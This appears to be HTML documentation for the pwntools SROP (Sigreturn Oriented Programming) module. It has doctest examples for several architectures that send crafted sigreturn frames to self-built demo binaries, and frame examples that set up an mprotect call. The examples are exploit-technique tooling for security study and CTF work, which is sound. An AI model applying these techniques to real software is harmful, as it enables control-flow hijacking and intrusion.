<span id="pwnlib-rop-srop-sigreturn-oriented-programming"></span><h5><a class="reference internal" href="#module-pwnlib.rop.srop" title="pwnlib.rop.srop"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.rop.srop</span></code></a> &#8212; Sigreturn Oriented Programming<a class="headerlink" href="#module-pwnlib.rop.srop" title="Permalink to this headline">¶</a></h5>
<p>Sigreturn ROP (SROP)</p>
<p>Sigreturn is a syscall used to restore the entire register context
from memory pointed at by ESP.</p>
<p>We can leverage this during ROP to gain control of registers for which
there are not convenient gadgets.  The main caveat is that <em>all</em> registers
are set, including ESP and EIP (or their equivalents).  This means that
in order to continue after using a sigreturn frame, the stack pointer
must be set accordingly.</p>
<p>i386 Example:</p>
<blockquote>
<div><p>Let&#8217;s just print a message out using SROP.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">message</span> <span class="o">=</span> <span class="s2">&quot;Hello, World</span><span class="se">\\</span><span class="s2">n&quot;</span>
</pre></div>
</div>
<p>First, we&#8217;ll create our example binary.
It just reads some data onto the stack, and invokes
the <code class="docutils literal"><span class="pre">sigreturn</span></code> syscall.
We also make an <code class="docutils literal"><span class="pre">int</span> <span class="pre">0x80</span></code> gadget available, followed
immediately by <code class="docutils literal"><span class="pre">exit(0)</span></code>.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span>  <span class="s1">&#39;read:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="s1">&#39;esp&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;sigreturn:&#39;</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sigreturn</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;int3:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">trap</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;syscall: &#39;</span>  <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;exit: &#39;</span>     <span class="o">+</span> <span class="s1">&#39;xor ebx, ebx; mov eax, 1; int 0x80;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;message: &#39;</span>  <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;.asciz &quot;</span><span class="si">%s</span><span class="s1">&quot;&#39;</span> <span class="o">%</span> <span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
</pre></div>
</div>
<p>Let&#8217;s construct our frame to have it invoke a <code class="docutils literal"><span class="pre">write</span></code>
syscall, and dump the message to stdout.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">eax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">ebx</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">ecx</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">edx</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">esp</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span>
</pre></div>
</div>
<p>Let&#8217;s start the process, send the data, and check the message.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello, World\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
</div></blockquote>
<p>amd64 Example:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;amd64&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span>  <span class="s1">&#39;read:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="s1">&#39;rsp&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;sigreturn:&#39;</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sigreturn</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;int3:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">trap</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;syscall: &#39;</span>  <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;exit: &#39;</span>     <span class="o">+</span> <span class="s1">&#39;xor rdi, rdi; mov rax, 60; syscall;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;message: &#39;</span>  <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;.asciz &quot;</span><span class="si">%s</span><span class="s1">&quot;&#39;</span> <span class="o">%</span> <span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello, World\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
<p>arm Example:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;arm&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span>  <span class="s1">&#39;read:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="s1">&#39;sp&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;sigreturn:&#39;</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sigreturn</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;int3:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">trap</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;syscall: &#39;</span>  <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;exit: &#39;</span>     <span class="o">+</span> <span class="s1">&#39;eor r0, r0; mov r7, 0x1; swi #0;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;message: &#39;</span>  <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;.asciz &quot;</span><span class="si">%s</span><span class="s1">&quot;&#39;</span> <span class="o">%</span> <span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">r7</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">r0</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">r1</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">r2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">sp</span> <span class="o">=</span> <span class="mh">0xdead0000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello, World\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
<p>Mips Example:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;mips&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;big&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span>  <span class="s1">&#39;read:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="s1">&#39;$sp&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;sigreturn:&#39;</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sigreturn</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;syscall: &#39;</span>  <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;exit: &#39;</span>     <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;message: &#39;</span>  <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;.asciz &quot;</span><span class="si">%s</span><span class="s1">&quot;&#39;</span> <span class="o">%</span> <span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">v0</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">a0</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">a1</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">a2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">sp</span> <span class="o">=</span> <span class="mh">0xdead0000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello, World\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
<p>Mipsel Example:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&quot;mips&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">&quot;little&quot;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">=</span>  <span class="s1">&#39;read:&#39;</span>      <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">constants</span><span class="o">.</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="s1">&#39;$sp&#39;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;sigreturn:&#39;</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">sigreturn</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;syscall: &#39;</span>  <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">syscall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;exit: &#39;</span>     <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">assembly</span> <span class="o">+=</span> <span class="s1">&#39;message: &#39;</span>  <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;.asciz &quot;</span><span class="si">%s</span><span class="s1">&quot;&#39;</span> <span class="o">%</span> <span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">v0</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_write</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">a0</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">STDOUT_FILENO</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">a1</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;message&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">a2</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">sp</span> <span class="o">=</span> <span class="mh">0xdead0000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">frame</span><span class="o">.</span><span class="n">pc</span> <span class="o">=</span> <span class="n">binary</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;syscall&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello, World\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="go">0</span>
</pre></div>
</div>
<dl class="class">
<dt id="pwnlib.rop.srop.SigreturnFrame">
<em class="property">class </em><code class="descclassname">pwnlib.rop.srop.</code><code class="descname">SigreturnFrame</code><span class="sig-paren">(</span><em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/rop/srop.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.rop.srop.SigreturnFrame" title="Permalink to this definition">¶</a></dt>
<dd><p>Crafts a sigreturn frame with values that are loaded up into
registers.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>arch</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The architecture. Currently <code class="docutils literal"><span class="pre">i386</span></code> and <code class="docutils literal"><span class="pre">amd64</span></code> are
supported.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<p>Crafting a SigreturnFrame that calls mprotect on amd64</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 51, 0, 0, 0, 0, 0, 0, 0]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">248</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0xa</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x00601000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x7</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">==</span> <span class="mi">248</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 6295552, 4096, 0, 0, 7, 10, 0, 0, 0, 0, 51, 0, 0, 0, 0, 0, 0, 0]</span>
</pre></div>
</div>
<p>Crafting a SigreturnFrame that calls mprotect on i386</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 115, 0, 0, 123, 0]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">eax</span> <span class="o">=</span> <span class="mi">125</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">ebx</span> <span class="o">=</span> <span class="mh">0x00601000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">ecx</span> <span class="o">=</span> <span class="mh">0x1000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">s</span><span class="o">.</span><span class="n">edx</span> <span class="o">=</span> <span class="mh">0x7</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">==</span> <span class="mi">80</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">unpack_many</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
<span class="go">[0, 0, 0, 0, 0, 0, 0, 0, 6295552, 7, 4096, 125, 0, 0, 0, 115, 0, 0, 123, 0]</span>
</pre></div>
</div>
<p>Crafting a SigreturnFrame that calls mprotect on ARM</p>
